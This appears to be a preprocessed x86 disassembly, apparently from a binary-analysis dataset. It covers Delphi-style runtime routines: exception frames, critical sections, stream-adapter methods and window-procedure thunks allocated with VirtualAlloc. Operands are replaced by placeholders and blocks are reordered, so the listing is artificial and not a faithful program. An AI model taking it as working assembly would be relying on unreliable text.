call sub_413964
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_4193c5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_419396
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_41942c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_4195e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_419478
push ebx
push esi
push ecx
call sub_40361c
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_4196cc
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_419674
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_414004
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_41963c
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_403604
lea eax [ ebx + 0x14 ]
call sub_40cdfc
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_413a74
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_4194fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413ad0
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413918
mov edx ebx
mov eax esi
call sub_4194fc
sub_419590
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413918
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x10 ] eax
sub_4195bc
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_413bb8
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403290
xor eax eax
mov [ ebx + 0x10 ] eax
sub_4195e4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40348c
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_419590
mov dl 0x1
mov eax ebx
call sub_419b04
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_419ab4
sub_41963c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_419b04
mov edx ebx
mov eax esi
call sub_4195bc
pop edi
pop esi
pop ebx
retn
sub_419674
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_413b5c
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_41963c
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_4195bc
sub_4196cc
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_413a74
call sub_4196cc
inc edi
dec esi
jne r-xdata
sub_419708
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_413bb8
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403290
xor eax eax
mov [ ebx + 0x14 ] eax
sub_41972c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419708
mov edx ebx
mov eax esi
call sub_419708
pop esi
pop ebx
retn
sub_419748
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_41972c
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413a74
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_4197a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_419550
push ebx
push sub_419578
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_419564
push ebx
push sub_419584
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_41989c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407ce4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_419934
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
sub_419934
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_413a74
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407ce4
test al al
jne r-xdata
sub_419984
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4043ec
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407e68
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
xor edx edx
mov eax ebx
call sub_419b04
mov edx esi
mov eax ebx
call sub_419a10
mov dl 0x1
mov eax ebx
call sub_419b04
sub_419a24
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413a74
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413a00
sub_419a60
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_413ad0
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413964
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_413af0
sub_419ab4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_419a50
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_419a24
mov cl 0x1
mov edx ebx
call sub_419ab4
inc edi
dec ebp
jne r-xdata
sub_419b04
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_40427c
mov edx esp
mov eax esi
call sub_403564
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_419b4c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_419b74
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_419bbc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403344
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_419c1c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_419c40
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_419c88
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
mov edx esi
call sub_419eb8
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_419cf0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_419eb8
mov edx ebx
mov eax esi
call sub_419eac
sub_419d34
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41942c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_419d78
push ebx
push esi
push edi
call sub_40361c
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419478
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_41972c
jmp r-xdata
mov eax esi
call sub_413b5c
mov edx eax
mov eax edi
call sub_419eb8
lea eax [ edi + 0x50 ]
call sub_40cdfc
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403604
sub_419dd8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419748
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_419e04
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_419e20
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_419e3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_413a74
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_419eb8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413964
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413a74
cmp ebp eax
jne r-xdata
sub_419ef8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_41972c
mov edx ebx
call sub_4194fc
sub_419f24
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_419f6c
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403290
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_419fa4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_419ff3
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a00c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a05b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a074
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a0de
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41a0f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a141
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_415750
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41a15c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_4056c0
xor eax eax
push ebp
push sub_41a349
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41a322
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026bc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41a311
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403ac8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a350
lea eax [ ebp + 0xc ]
call sub_40564c
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403ac8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41a38c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41a3ef
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a420
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_413de0
mov edi eax
xor eax eax
push ebp
push sub_41a475
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a47c
mov eax [ rw-data ]
call sub_413e44
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413a74
call sub_403290
inc esi
dec ebx
jne r-xdata
sub_41a494
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41a4bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028b8
mov edx sub_41a494
lea eax [ esi + 0x5 ]
call sub_41a4b4
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41a4b4
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41a578
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406a40
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a4bc
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41a62c
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
